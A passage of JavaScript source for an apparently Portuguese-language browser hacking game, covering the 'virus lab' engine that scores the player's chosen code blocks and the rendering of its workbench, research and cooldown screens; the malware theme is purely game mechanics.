        const m3 = !b3 || b3.channel === b1.channel || b3.channel === 'universal_cloak';
        if (hasTrap) {
          feel = ' · <span style="color:#fca5a5;">⚠️ Atenção: uma das rotinas escolhidas pausa a execução e pode deixar o vírus lento!</span>';
        } else if (mA && mB && m3) {
          feel = ' · <span style="color:#86efac;">✨ As partes escolhidas até agora conversam na mesma linha de código!</span>';
        } else {
          feel = ' · <span style="color:#fde68a;">🔀 Combinação mista: está juntando rotinas de áreas diferentes (pode gerar mutação híbrida ou perder eficiência).</span>';
        }
      }

      return `🧩 <strong>Noção do seu combo até agora:</strong> ${steps.join(' → ')}${feel}`;
    }

    // =========================================================================
    // MOTOR DE AVALIAÇÃO DE ENCAIXE + MULTIPLICADOR REGRESSIVO (v10.0 = 3.00x)
    // =========================================================================
    evaluateAssembly(b1Id, b2Ids, b3Id) {
      const b1 = BLOCK_BY_ID.get(b1Id);
      const b2a = BLOCK_BY_ID.get(b2Ids && b2Ids[0]);
      const b2b = BLOCK_BY_ID.get(b2Ids && b2Ids[1]);
      const b3 = BLOCK_BY_ID.get(b3Id);
      if (!b1 || !b2a || !b2b || !b3 || b2a.id === b2b.id) {
        return null;
      }

      const diagnostics = [];
      let fitScore = 28;

      const match2a = b2a.channel === b1.channel || b2a.channel === 'universal_boost';
      const match2b = b2b.channel === b1.channel || b2b.channel === 'universal_boost';
      const hasStallTrap = b2a.channel === 'sync_stall' || b2b.channel === 'sync_stall';

      if (match2a && match2b) {
        fitScore += 32;
        diagnostics.push({
          kind: 'good',
          text: `Encaixe limpo de barramento: ${b1.fn.split('(')[0]} alimenta diretamente os dois núcleos do Round 2 sem conversão forçada.`
        });
      } else if (match2a || match2b) {
        fitScore += 14;
        diagnostics.push({
          kind: 'warn',
          text: `Acoplamento parcial no Round 2: apenas um dos blocos compartilha o canal nativo (${b1.channel}); o outro exigiu adaptação.`
        });
      } else {
        fitScore -= 10;
        diagnostics.push({
          kind: 'bad',
          text: `Atrito na Entrada: canal ${b1.channel} foi ligado a rotinas de outra finalidade (${b2a.channel} / ${b2b.channel}), perdendo força.`
        });
      }

      if (hasStallTrap) {
        fitScore -= 18;
        diagnostics.push({
          kind: 'bad',
          text: `Gargalo severo detectado: serialized_debug_barrier() pausou o código com sleep(2) no meio da execução!`
        });
      } else if (b2a.channel === b2b.channel && b2a.subRole !== b2b.subRole) {
        fitScore += 18;
        diagnostics.push({
          kind: 'good',
          text: `Dupla complementar no Round 2 (${b2a.subRole} + ${b2b.subRole}): geração e despacho trabalhando juntos.`
        });
      } else if (b2a.channel === 'universal_boost' || b2b.channel === 'universal_boost') {
        fitScore += 16;
        diagnostics.push({
          kind: 'good',
          text: `Acelerador assíncrono/sem travas acoplado ao núcleo principal, elevando o rendimento.`
        });
      } else if (b2a.channel === b2b.channel) {
        fitScore += 10;
        diagnostics.push({
          kind: 'good',
          text: `Dois módulos da mesma família (${b2a.channel}) operando em sequência.`
        });
      } else {
        fitScore -= 4;
        diagnostics.push({
          kind: 'warn',
          text: `Núcleos híbridos de áreas distintas (${b2a.channel} + ${b2b.channel}) dividindo recursos.`
        });
      }

      const r3MatchesR1 = b3.channel === b1.channel || b3.channel === 'universal_cloak';
      const r3MatchesAnyR2 = b3.channel === b2a.channel || b3.channel === b2b.channel;
      if (r3MatchesR1 && (match2a || match2b)) {
        fitScore += 22;
        diagnostics.push({
          kind: 'good',
          text: `Fechamento limpo no Round 3: ${b3.fn.split('(')[0]} selou o canal e escondeu os rastros.`
        });
      } else if (r3MatchesR1 || r3MatchesAnyR2) {
        fitScore += 10;
        diagnostics.push({
          kind: 'warn',
          text: `Fechamento funcional parcial: encerramento cumpriu o básico com leve perda de furtividade.`
        });
      } else {
        fitScore -= 8;
        diagnostics.push({
          kind: 'bad',
          text: `Desfecho desalinhado no Round 3: rotina ${b3.channel} não limpa o tipo de abertura iniciada no Round 1.`
        });
      }

      const tiers = [b1.tier, b2a.tier, b2b.tier, b3.tier];
      const avgTier = tiers.reduce((a, b) => a + b, 0) / 4;
      const tierSpread = Math.max(...tiers) - Math.min(...tiers);
      if (tierSpread <= 1) fitScore += 4;

      fitScore = Math.max(12, Math.min(100, Math.round(fitScore)));

      const famScores = { vspam: 0, vwarez: 0, vminer: 0, vbank: 0, vddos: 0 };
      if (famScores[b1.family] != null) famScores[b1.family] += 3.0;
      if (famScores[b2a.family] != null) famScores[b2a.family] += 2.6;
      if (famScores[b2b.family] != null) famScores[b2b.family] += 2.6;
      if (famScores[b3.family] != null) famScores[b3.family] += 2.2;

      let dominantFamily = b1.family in famScores ? b1.family : 'vspam';
      let bestFamWeight = -1;
      for (const [fk, fw] of Object.entries(famScores)) {
        if (fw > bestFamWeight) {
          bestFamWeight = fw;
          dominantFamily = fk;
        }
      }

      let matchedSet = null;
      if (fitScore >= 62 && !hasStallTrap) {
        matchedSet = this.resolveSynergySet(b1, b2a, b2b, b3, dominantFamily, avgTier, fitScore);
      }

      let fitGrade = 'F';
      if (fitScore >= 94) fitGrade = 'S+';
      else if (fitScore >= 85) fitGrade = 'S';
      else if (fitScore >= 74) fitGrade = 'A';
      else if (fitScore >= 62) fitGrade = 'B';
      else if (fitScore >= 46) fitGrade = 'C';
      else if (fitScore >= 30) fitGrade = 'D';

      const lvlMeta = this.getLevelMeta();
      const fitRatio = fitScore / 100;
      const tierFactor = 0.55 + (avgTier / 5) * 0.45;
      const setMult = matchedSet ? matchedSet.bonusMult : 0.86;

      let rawVerInt;
      if (fitScore < 42) {
        rawVerInt = Math.round(6 + (lvlMeta.maxVerInt * 0.28 * fitRatio));
      } else {
        rawVerInt = Math.round(lvlMeta.maxVerInt * Math.pow(fitRatio, 1.18) * tierFactor * (setMult / 1.15));
      }
      const versionInt = Math.max(6, Math.min(lvlMeta.maxVerInt, rawVerInt));
      const yieldMultiplier = calcVirusMultiplier(versionInt);

      const fusedCode = [
        `/* === [ROUND 1 · VETOR] ${b1.fn} (${b1.lang}) === */`,
        b1.code,
        '',
        `/* === [ROUND 2A · NÚCLEO] ${b2a.fn} (${b2a.lang}) === */`,
        b2a.code,
        '',
        `/* === [ROUND 2B · NÚCLEO] ${b2b.fn} (${b2b.lang}) === */`,
        b2b.code,
        '',
        `/* === [ROUND 3 · FECHAMENTO] ${b3.fn} (${b3.lang}) === */`,
        b3.code
      ].join('\n');

      return {
        blocks: [b1, b2a, b2b, b3],
        dominantFamily,
        familyMeta: VIRUS_FAMILY_META[dominantFamily],
        fitScore,
        fitGrade,
        avgTier: +avgTier.toFixed(2),
        matchedSet,
        versionInt,
        versionLabel: 'v' + (versionInt / 10).toFixed(1),
        yieldMultiplier,
        diagnostics,
        fusedCode
      };
    }

    resolveSynergySet(b1, b2a, b2b, b3, dominantFamily, avgTier, fitScore) {
      const lvlMeta = this.getLevelMeta();
      if (b1.tier === 5 && (b2a.id === 'R2_24' || b2b.id === 'R2_24') && b3.id === 'R3_16' && lvlMeta.maxTier >= 5) {
        return SET_BY_ID.get('SET_54');
      }
      const channels = new Set([b1.channel, b2a.channel, b2b.channel, b3.channel]);
      if (channels.has('simd_alu') && (channels.has('raw_pkt') || channels.has('p2p_chunk')) && fitScore >= 65) {
        return SET_BY_ID.get('SET_51');
      }
      if (channels.has('mail_pipe') && channels.has('tls_mem') && fitScore >= 65) {
        return SET_BY_ID.get('SET_52');
      }
      if (channels.has('p2p_chunk') && channels.has('raw_pkt') && fitScore >= 65) {
        return SET_BY_ID.get('SET_53');
      }

      const famSets = VIRUS_SYNERGY_SETS.filter(
        (s) => !s.isHybrid && s.family === dominantFamily && s.minTier <= lvlMeta.maxTier
      );
      if (famSets.length === 0) return VIRUS_SYNERGY_SETS[0];

      const hashNums = [b1.id, b2a.id, b2b.id, b3.id]
        .join('|')
        .split('')
        .reduce((acc, ch) => ((acc * 33) + ch.charCodeAt(0)) >>> 0, 5381);

      const targetTier = Math.max(1, Math.min(lvlMeta.maxTier, Math.round(avgTier)));
      const nearTierSets = famSets.filter((s) => Math.abs(s.minTier - targetTier) <= 1);
      const candidateList = nearTierSets.length > 0 ? nearTierSets : famSets;
      return candidateList[hashNums % candidateList.length];
    }

    compileCurrentDraft(customNameInput) {
      this.ensureLoaded();
      const draft = this.state.activeDraft;
      if (!draft) return { success: false, message: 'Nenhum rascunho ativo na bancada.' };
      if (!draft.picks.r1 || !Array.isArray(draft.picks.r2) || draft.picks.r2.length !== 2 || !draft.picks.r3) {
        return { success: false, message: 'Complete os 3 rounds (1 + 2 + 1 blocos) antes de compilar!' };
      }

      const domNameEl = typeof document !== 'undefined' ? document.getElementById('vlabStrainNameInput') : null;
      const rawStrainName = String(customNameInput || (domNameEl && domNameEl.value) || draft.customName || 'Cepa-Zero').trim();
      const strainName = rawStrainName.slice(0, 26) || 'Cepa-Zero';

      ROUND_1_BLOCKS.concat(ROUND_2_BLOCKS, ROUND_3_BLOCKS).forEach((b) => {
        if (!BLOCK_BY_ID.has(b.id)) BLOCK_BY_ID.set(b.id, b);
      });

      const evalRes = this.evaluateAssembly(draft.picks.r1, draft.picks.r2, draft.picks.r3);
      if (!evalRes) {
        return { success: false, message: 'Falha ao validar os blocos selecionados.' };
      }

      const pickedIds = [draft.picks.r1, draft.picks.r2[0], draft.picks.r2[1], draft.picks.r3];
      const kpCheck = (window.topTenMechanics && typeof window.topTenMechanics.evaluateRelicKernelPanic === 'function')
        ? window.topTenMechanics.evaluateRelicKernelPanic(pickedIds, evalRes.fitGrade)
        : { kernelPanic: false };

      if (kpCheck.kernelPanic) {
        this.state.lastCompileAt = Date.now();
        this.state.activeDraft = null;
        this.lastCompileReport = {
          strainName,
          familyMeta: evalRes.familyMeta,
          versionLabel: 'v0.0 (KERNEL PANIC)',
          effectiveVerLabel: 'v0.0 (QUEIMADO)',
          yieldMultiplier: 0,
          effectiveMult: 0,
          fitScore: evalRes.fitScore,
          fitGrade: evalRes.fitGrade,
          matchedSet: null,
          isNewSetDiscovery: false,
          gainedXp: 10,
          leveledUp: false,
          newLevel: this.state.level,
          outcomeMode: 'kernel_panic_burned',
          outcomeNote: kpCheck.message,
          diagnostics: [{ kind: 'bad', text: kpCheck.message }, ...evalRes.diagnostics],
          fusedCode: evalRes.fusedCode
        };
        this.save();
        if (typeof window.showToast === 'function') window.showToast(kpCheck.message);
        this.renderUI();
        return { success: false, code: 'RELIC_KERNEL_PANIC', kernelPanic: true, heatSpikeC: 18, report: this.lastCompileReport, message: kpCheck.message };
      }

      const lvlMeta = this.getLevelMeta();
      const labBoosts = (window.ecosystemHub && typeof window.ecosystemHub.consumeLabCompileBoosts === 'function')
        ? window.ecosystemHub.consumeLabCompileBoosts()
        : { fitBonus: 0, extraXp: 0, xpMult: 1, usedCatalyst: false };

      if (labBoosts.fitBonus > 0) {
        evalRes.fitScore = Math.min(100, evalRes.fitScore + labBoosts.fitBonus);
        if (evalRes.fitScore >= 94) evalRes.fitGrade = 'S+';
        else if (evalRes.fitScore >= 85) evalRes.fitGrade = 'S';
        else if (evalRes.fitScore >= 74) evalRes.fitGrade = 'A';
        else if (evalRes.fitScore >= 62) evalRes.fitGrade = 'B';
        const boostedVer = Math.max(evalRes.versionInt, Math.min(lvlMeta.maxVerInt, evalRes.versionInt + Math.round(labBoosts.fitBonus * 0.4)));
        evalRes.versionInt = boostedVer;
        evalRes.versionLabel = 'v' + (boostedVer / 10).toFixed(1);
        evalRes.yieldMultiplier = calcVirusMultiplier(boostedVer);
        evalRes.diagnostics.push({
          kind: 'good',
          text: `Sinergia Externa Aplicada (+${labBoosts.fitBonus} pts de Encaixe${labBoosts.usedCatalyst ? ' c/ Catalisador de Bancada' : ' via Classe/Passivas'}): potência calibrada para ${evalRes.versionLabel}!`
        });
      }

      let isNewSetDiscovery = false;
      if (evalRes.matchedSet && !this.state.discoveredSets.includes(evalRes.matchedSet.id)) {
        this.state.discoveredSets.push(evalRes.matchedSet.id);
        isNewSetDiscovery = true;
      }

      // Entrega no SoftwareEngine (tratando inédito, upgrade ou MESMO VÍRUS repetido!)
      let diskDelivery = null;
      if (window.softwareEngine && typeof window.softwareEngine.registerLabCompiledVirus === 'function') {
        diskDelivery = window.softwareEngine.registerLabCompiledVirus({
          virusKey: evalRes.dominantFamily,
          versionInt: evalRes.versionInt,
          maxLabVerInt: lvlMeta.maxVerInt,
          strainName,
          setId: evalRes.matchedSet ? evalRes.matchedSet.id : null,
          setTitle: evalRes.matchedSet ? evalRes.matchedSet.name : null,
          fitGrade: evalRes.fitGrade,
          fitScore: evalRes.fitScore
        });
      }

      // Se deu o MESMO VÍRUS em versão menor/igual, concede bônus extra de XP de Reciclagem!
      const prevLevel = this.state.level;
      const baseXp = 35 + Math.round(evalRes.fitScore * 0.65);
      const discoveryBonusXp = isNewSetDiscovery ? 45 : 0;
      const duplicateRecycleXp = (diskDelivery && (diskDelivery.outcomeMode === 'duplicate_refined' || diskDelivery.outcomeMode === 'duplicate_maxed'))
        ? Math.round(baseXp * 0.35)
        : 0;
      const gainedXp = Math.round((baseXp + discoveryBonusXp + duplicateRecycleXp + (labBoosts.extraXp || 0)) * Number(labBoosts.xpMult || 1));

      this.state.xp += gainedXp;
      const updatedLvl = this.computeLevelFromXp(this.state.xp, prevLevel);
      this.state.level = updatedLvl.level;
      const leveledUp = this.state.level > prevLevel;
      this.state.totalCompiled = (this.state.totalCompiled || 0) + 1;

      const repGain = Math.max(8, Math.round(evalRes.fitScore * 0.3));
      if (window.currentProfile) {
        const grantRep = () => {
          window.currentProfile.reputation = (Number(window.currentProfile.reputation) || 0) + repGain;
        };
        if (window.integrityGuard && typeof window.integrityGuard.runAuthorized === 'function') {
          window.integrityGuard.runAuthorized(grantRep);
        } else {
          grantRep();
        }
      }

      const effectiveVerLabel = diskDelivery ? diskDelivery.activeVersion : evalRes.versionLabel;
      const effectiveMult = diskDelivery ? diskDelivery.activeMultiplier : evalRes.yieldMultiplier;

      const creationRecord = {
        id: 'strain_' + Date.now() + '_' + Math.floor(Math.random() * 999),
        createdAt: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }),
        strainName,
        family: evalRes.dominantFamily,
        filename: evalRes.familyMeta.filename,
        versionInt: evalRes.versionInt,
        versionLabel: evalRes.versionLabel,
        yieldMultiplier: evalRes.yieldMultiplier,
        effectiveVerLabel,
        effectiveMult,
        outcomeMode: diskDelivery ? diskDelivery.outcomeMode : 'new_unlock',
        fitScore: evalRes.fitScore,
        fitGrade: evalRes.fitGrade,
        setId: evalRes.matchedSet ? evalRes.matchedSet.id : null,
        setName: evalRes.matchedSet ? evalRes.matchedSet.name : 'Protótipo Sem Conjunto',
        blockIds: [draft.picks.r1, draft.picks.r2[0], draft.picks.r2[1], draft.picks.r3]
      };
      this.state.creations.unshift(creationRecord);
      if (this.state.creations.length > 30) this.state.creations.length = 30;

      // Registra o timestamp da compilação concluída para travar 1x por Mês (1 dia real = 24h)!
      this.state.lastCompiledAtMs = Date.now();
      this.state.activeDraft = null;
      this.lastCompileReport = {
        ...evalRes,
        strainName,
        gainedXp,
        discoveryBonusXp,
        duplicateRecycleXp,
        isNewSetDiscovery,
        prevLevel,
        newLevel: this.state.level,
        leveledUp,
        repGain,
        diskDelivery
      };

      this.save();
      if (window.onlineEngine) window.onlineEngine.scheduleSave(false);
      if (typeof window.updateHudDisplays === 'function') window.updateHudDisplays();
      if (typeof window.addLocalLog === 'function') {
        window.addLocalLog(
          'VIRUS-LAB',
          `Cepa "${strainName}" (${evalRes.familyMeta.filename} ${evalRes.versionLabel} · ${evalRes.yieldMultiplier.toFixed(2)}x) — Encaixe ${evalRes.fitScore}% (${evalRes.fitGrade}) · +${gainedXp} XP`,
          evalRes.fitScore >= 62 ? 'success' : 'warn'
        );
      }
      if (window.hackerAudio && evalRes.fitScore >= 62 && typeof window.hackerAudio.playCashChime === 'function') {
        window.hackerAudio.playCashChime();
      }
      if (typeof window.showToast === 'function') {
        if (diskDelivery && diskDelivery.outcomeMode === 'duplicate_refined') {
          window.showToast(`♻️ Mesmo vírus! Sua cepa ${evalRes.familyMeta.filename} foi lapidada para ${diskDelivery.activeVersion} (${diskDelivery.activeMultiplier.toFixed(2)}x)!`);
        } else if (diskDelivery && diskDelivery.outcomeMode === 'duplicate_maxed') {
          window.showToast(`♻️ Você já tinha ${evalRes.familyMeta.filename} no teto (${diskDelivery.activeVersion} · ${diskDelivery.activeMultiplier.toFixed(2)}x)! Convertido em +${gainedXp} XP!`);
        } else {
          window.showToast(
            leveledUp
              ? `🎉 Lab Nível ${this.state.level}! ${evalRes.familyMeta.filename} ${effectiveVerLabel} (${effectiveMult.toFixed(2)}x) salvo no PC!`
              : `🧬 ${evalRes.familyMeta.filename} ${effectiveVerLabel} (${effectiveMult.toFixed(2)}x) salvo no seu PC!`
          );
        }
      }

      this.renderUI();
      this.scrollLabToTop();
      return { success: true, report: this.lastCompileReport };
    }

    switchTab(tabKey) {
      this.activeTab = ['workbench', 'creations', 'codex', 'research'].includes(tabKey) ? tabKey : 'workbench';
      this.renderUI();
    }

    openForSoftwareUpgrade(softKey = 'cracker') {
      this.ensureLoaded();
      this.highlightedResearchSoftKey = softKey || 'cracker';
      this.activeTab = 'research';
      if (window.progressiveUnlockEngine) {
        window.progressiveUnlockEngine.ensureLoaded();
        window.progressiveUnlockEngine.state.everUnlocked.winVirusLab = true;
        window.progressiveUnlockEngine.save();
        if (typeof window.progressiveUnlockEngine.syncAllSidebarItems === 'function') {
          window.progressiveUnlockEngine.syncAllSidebarItems();
        }
      }
      if (typeof window.navTo === 'function') window.navTo('winVirusLab');
      this.renderUI();
    }

    renderResearchToolsHtml() {
      if (!window.softwareEngine) return '<div class="hc-card" style="padding:18px;">Carregando programas...</div>';
      const se = window.softwareEngine;
      se.ensureLoaded();
      const keys = ['cracker', 'exploit_ssh', 'exploit_ftp', 'firewall', 'hasher', 'antivirus', 'seeker', 'hider'];
      const focusKey = this.highlightedResearchSoftKey || '';
      const cards = keys.map((k) => {
        const def = se.getDefinition(k);
        const cur = se.state.inventory[k] || { owned: false, versionInt: 0, licensed: true };
        if (!def) return '';
        const owned = !!(cur.owned && cur.versionInt > 0);
        const curVerStr = owned ? se.fmtVer(cur.versionInt) : 'Não baixado';
        const maxVer = def.maxVerInt || 100;
        const stepVer = k === 'analyzer' ? 10 : 5;
        const nextVerStr = se.fmtVer(Math.min(maxVer, (cur.versionInt || 10) + stepVer));
        const isMax = owned && cur.versionInt >= maxVer;
        const needsLicense = owned && cur.licensed === false;
        const licCost = needsLicense ? se.getLicenseCost(k) : 0;
        const upgCost = owned && !isMax ? se.getResearchCost(k) : 0;
        const isFocused = focusKey === k;
        let btnHtml = '';
        if (!owned) {
          const dlIp = (k === 'exploit_ssh' || k === 'exploit_ftp') ? '185.220.101.9' : (k === 'seeker' || k === 'hider' ? '109.64.200.10' : '33.8.2.71');
          btnHtml = `<button type="button" class="hc-btn ghost sm" onclick="window.internetEngine.openIp('${dlIp}')">📍 Buscar v1.0 (${dlIp}) →</button>`;
        } else if (isMax) {
          btnHtml = `<span class="hc-badge success">Versão Máxima (${curVerStr})</span>`;
        } else if (needsLicense) {
          btnHtml = `<button type="button" id="btnLabLic_${k}" class="hc-btn sm" style="border-color:var(--hc-warning);color:var(--hc-warning);" onclick="window.softwareEngine.buyLicense('${k}');window.virusLabEngine.renderUI();">🔑 Registrar Licença ($ ${licCost.toLocaleString('pt-BR')})</button>`;
        } else {
          btnHtml = `<button type="button" id="btnLabUpg_${k}" class="hc-btn primary sm" onclick="window.softwareEngine.researchUpgrade('${k}').then((r)=>{if(r&&window.showToast)window.showToast(r.message);window.virusLabEngine.renderUI();})">🔬 Evoluir p/ ${nextVerStr} ($ ${upgCost.toLocaleString('pt-BR')})</button>`;
        }
        return `
          <div class="hc-card" id="vlabResearchCard_${k}" style="padding:12px 14px;display:flex;justify-content:space-between;align-items:center;gap:10px;flex-wrap:wrap;border-color:${isFocused ? 'var(--hc-accent)' : 'var(--hc-border)'};background:${isFocused ? 'rgba(53,184,119,0.09)' : 'var(--hc-surface)'};">
            <div style="min-width:190px;flex:1;">
              <div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap;">
                <strong style="font-size:13.5px;color:var(--hc-text);">${esc(def.friendlyTitle || def.filename)}</strong>
                <span class="mono" style="font-size:11.5px;color:var(--hc-text-3);">${esc(def.filename)}</span>
                <span class="hc-badge ${owned ? 'info' : ''}">${esc(curVerStr)}</span>
                ${isFocused ? '<span class="hc-badge success">🎯 Recomendado p/ seu Alvo</span>' : ''}
              </div>
              <div style="font-size:12px;color:var(--hc-text-2);margin-top:3px;">${esc(def.desc || '')}</div>
            </div>
            <div>${btnHtml}</div>
          </div>`;
      }).join('');
      return `
        <div style="display:flex;flex-direction:column;gap:10px;">
          <div class="hc-card" style="padding:14px 16px;border-color:rgba(56,189,248,0.4);background:rgba(14,24,38,0.85);">
            <div class="hc-eyebrow" style="color:#7dd3fc;">Bancada de Pesquisa &amp; Evolução de Programas</div>
            <div style="font-size:13px;color:var(--hc-text-2);margin-top:4px;">Quando não houver mais enigmas dando versões superiores, evolua aqui seu <strong>Cracker</strong>, <strong>Exploits</strong> e <strong>Defesas</strong> de <code>+0.5 em +0.5</code> até <code>v10.0</code>!</div>
          </div>
          ${cards}
        </div>`;
    }

    renderUI(mountId = 'virusLabAppBody') {
      this.ensureLoaded();
      const mount = typeof document !== 'undefined' ? document.getElementById(mountId) : null;
      if (!mount) return;

      const lvl = this.getLevelMeta();
      const stats = this.getCombinatoricsStats();
      const discCount = this.state.discoveredSets.length;

      let mainHtml = '';
      if (this.activeTab === 'workbench') {
        mainHtml = this.renderWorkbenchHtml(lvl);
      } else if (this.activeTab === 'research') {
        mainHtml = this.renderResearchToolsHtml();
      } else if (this.activeTab === 'creations') {
        mainHtml = this.renderCreationsHtml();
      } else {
        mainHtml = this.renderCodexHtml(lvl);
      }

      const sideHtml = this.renderSidebarHtml(lvl, stats, discCount);

      mount.innerHTML = `
        <div class="soft-frame">
          <div class="vlab-top-tabs" role="tablist" aria-label="Abas do Laboratório de Vírus">
            <button type="button" role="tab" id="vlabTabWorkbench" class="vlab-tab-btn"
              aria-selected="${this.activeTab === 'workbench' ? 'true' : 'false'}"
              onclick="window.virusLabEngine.switchTab('workbench')">
              ${window.HC ? HC.icon('code-2') : ''}
              <span>Bancada de Vírus (3 Rounds)</span>
            </button>
            <button type="button" role="tab" id="vlabTabResearch" class="vlab-tab-btn"
              aria-selected="${this.activeTab === 'research' ? 'true' : 'false'}"
              onclick="window.virusLabEngine.switchTab('research')">
              ${window.HC ? HC.icon('flask-conical') : ''}
              <span>🔬 Evoluir Programas (P&amp;D)</span>
            </button>
            <button type="button" role="tab" id="vlabTabCreations" class="vlab-tab-btn"
              aria-selected="${this.activeTab === 'creations' ? 'true' : 'false'}"
              onclick="window.virusLabEngine.switchTab('creations')">
              ${window.HC ? HC.icon('bug') : ''}
              <span>Minhas Criações (${this.state.creations.length})</span>
            </button>
            <button type="button" role="tab" id="vlabTabCodex" class="vlab-tab-btn"
              aria-selected="${this.activeTab === 'codex' ? 'true' : 'false'}"
              onclick="window.virusLabEngine.switchTab('codex')">
              ${window.HC ? HC.icon('book-open') : ''}
              <span>Códice de Conjuntos (${discCount}/${stats.totalSynergySets})</span>
            </button>
          </div>

          <div class="vlab-layout">
            <div role="tabpanel" aria-labelledby="${this.activeTab === 'workbench' ? 'vlabTabWorkbench' : (this.activeTab === 'creations' ? 'vlabTabCreations' : 'vlabTabCodex')}">
              ${window.topTenMechanics && typeof window.topTenMechanics.renderLabRelicsAndCommissionBannerHtml === 'function'
                ? window.topTenMechanics.renderLabRelicsAndCommissionBannerHtml()
                : ''}
              ${mainHtml}
            </div>
            <aside class="vlab-side-stack" aria-label="Progresso e Escala Regressiva do Laboratório">
              ${sideHtml}
            </aside>
          </div>
        </div>
      `;
    }

    renderWorkbenchHtml(lvl) {
      if (this.lastCompileReport && !this.state.activeDraft) {
        return this.renderCompileReportHtml(this.lastCompileReport);
      }

      const remCooldownMs = this.getCooldownRemainingMs();
      if (!this.state.activeDraft && remCooldownMs > 0) {
        return `
          <div class="hc-card" id="vlabCooldownGateCard" style="padding:26px 24px;border-color:rgba(245,158,11,0.45);background:linear-gradient(160deg,rgba(20,24,32,0.98),rgba(12,16,22,0.98));">
            <div style="display:flex;justify-content:space-between;align-items:flex-start;gap:14px;flex-wrap:wrap;">
              <div>
                <div class="hc-eyebrow" style="color:#fbbf24;">Bancada em Resfriamento · Limite de 1 Vez por Mês (Dia)</div>
                <h3 style="margin:6px 0 8px;font-size:1.18rem;color:var(--hc-text);">Você já utilizou o Laboratório neste Mês (Dia)!</h3>
                <p style="margin:0;font-size:0.86rem;color:var(--hc-text-2);max-width:640px;line-height:1.55;">
                  O sintetizador compila apenas <strong>1 vírus por Mês do jogo (equivalente a 1 dia / 24h reais)</strong>,
                  mediante a taxa de operação de <strong>$ ${LAB_SESSION_FEE.toLocaleString('pt-BR')}</strong>. Enquanto aguarda a próxima janela,
                  use seus vírus já criados em invasões!
                </p>
              </div>
              <div style="padding:12px 16px;border-radius:10px;background:#090d12;border:1px solid rgba(245,158,11,0.4);text-align:center;min-width:190px;">
                <div style="font-size:0.68rem;color:var(--hc-text-3);font-family:var(--hc-font-mono);text-transform:uppercase;">Próximo Uso Liberado Em</div>
                <div id="vlabLiveCooldownTimer" style="font-family:var(--hc-font-mono);font-size:1.25rem;font-weight:800;color:#fbbf24;margin-top:4px;">
                  ${esc(this.formatCooldownMs(remCooldownMs))}
                </div>
              </div>
            </div>
            <div style="display:flex;gap:10px;flex-wrap:wrap;margin-top:18px;padding-top:14px;border-top:1px solid var(--hc-border);">
              <button type="button" class="hc-btn ghost sm" onclick="window.virusLabEngine.switchTab('creations')">Ver Minhas Criações (${this.state.creations.length})</button>
              <button type="button" class="hc-btn ghost sm" onclick="window.virusLabEngine.switchTab('codex')">Abrir Códice de 54 Conjuntos</button>
              <button type="button" class="hc-btn primary sm" onclick="window.navTo('winSoftware')">Ir p/ Programas &amp; Proteção</button>
            </div>
          </div>
        `;
      }

      if (!this.state.activeDraft) {
        const bal = window.currentWallet ? Number(window.currentWallet.balance || 0) : 0;
        const canAfford = bal >= LAB_SESSION_FEE;
        return `
          <div class="hc-card" id="vlabPayGateCard" style="padding:26px 24px;border-color:rgba(53,184,119,0.45);background:linear-gradient(160deg,rgba(15,24,24,0.96),rgba(11,15,21,0.98));">
            <div style="display:flex;justify-content:space-between;align-items:flex-start;gap:16px;flex-wrap:wrap;">
              <div style="max-width:640px;">
                <div class="hc-eyebrow" style="color:#4ade80;">Acesso Controlado · 1 Tentativa por Mês (Dia)</div>
                <h3 style="margin:6px 0 8px;font-size:1.22rem;color:var(--hc-text);">Iniciar Sessão no Laboratório de Vírus</h3>
                <p style="margin:0 0 12px;font-size:0.86rem;color:var(--hc-text-2);line-height:1.55;">
                  Cada abertura da bancada custa <strong>$ ${LAB_SESSION_FEE.toLocaleString('pt-BR')}</strong> e pode ser realizada
                  <strong>apenas 1 vez por Mês (1 dia real / 24h)</strong>. Você passará por <strong>3 rounds aleatórios</strong>
                  (escolher 1 → escolher 2 → escolher 1 bloco de código) para gerar um vírus inédito ou lapidar um existente até <strong>v10.0 (3.00x)</strong>!
                </p>
                <div style="display:flex;gap:8px;flex-wrap:wrap;font-family:var(--hc-font-mono);font-size:0.75rem;">
                  <span class="hc-badge info">Taxa única: $ ${LAB_SESSION_FEE.toLocaleString('pt-BR')}</span>
                  <span class="hc-badge">Limite: 1x a cada 24h (1 Mês)</span>
                  <span class="hc-badge ${canAfford ? 'success' : 'danger'}">Seu saldo: $ ${bal.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}</span>
                </div>
              </div>
              <div style="display:flex;flex-direction:column;align-items:flex-end;gap:8px;">
                <button type="button" id="btnVlabPayAndStart" class="hc-btn primary" ${canAfford ? '' : 'disabled'}
                  onclick="window.virusLabEngine.unlockPaidLabSession()">
                  🔓 Pagar $ ${LAB_SESSION_FEE.toLocaleString('pt-BR')} &amp; Abrir Bancada (3 Rounds)
                </button>
                ${!canAfford ? `<span style="font-size:0.75rem;color:#fca5a5;">Junte pelo menos $ ${LAB_SESSION_FEE.toLocaleString('pt-BR')} em missões ou coletas para usar o laboratório!</span>` : ''}
              </div>
            </div>
          </div>
        `;
      }

      const draft = this.state.activeDraft;
      const r = draft.round;
      const cardIds = draft.optionsByRound[r] || [];

      const roundMeta = {
        1: {
          title: 'Round 1 de 3 — Vetor de Abertura',
          sub: 'Veja a leve explicação de cada trecho abaixo e escolha APENAS 1 bloco inicial para abrir o funcionamento do seu vírus.',
          req: 1,
          curCount: draft.picks.r1 ? 1 : 0
        },
        2: {
          title: 'Round 2 de 3 — Dupla de Núcleos de Processamento',
          sub: 'Agora escolha EXATAMENTE 2 blocos que combinem entre si e façam sentido com a abertura que você escolheu no Round 1.',
          req: 2,
          curCount: (draft.picks.r2 || []).length
        },
        3: {
          title: 'Round 3 de 3 — Rotina de Fechamento & Camuflagem',
          sub: 'Última rodada! Escolha APENAS 1 bloco final para encerrar e esconder o código antes de compilar.',
          req: 1,
          curCount: draft.picks.r3 ? 1 : 0
        }
      }[r];

      const cardsHtml = cardIds.map((id, idx) => {
        const b = BLOCK_BY_ID.get(id);
        if (!b) return '';
        const isSelected = r === 1
          ? draft.picks.r1 === id
          : (r === 2 ? (draft.picks.r2 || []).includes(id) : draft.picks.r3 === id);
        const selOrder = r === 2 && isSelected ? ` #${draft.picks.r2.indexOf(id) + 1}` : '';

        return `
          <button type="button" class="vlab-block-card" id="vlabCard_${esc(b.id)}"
            data-block-id="${esc(b.id)}"
            aria-pressed="${isSelected ? 'true' : 'false'}"
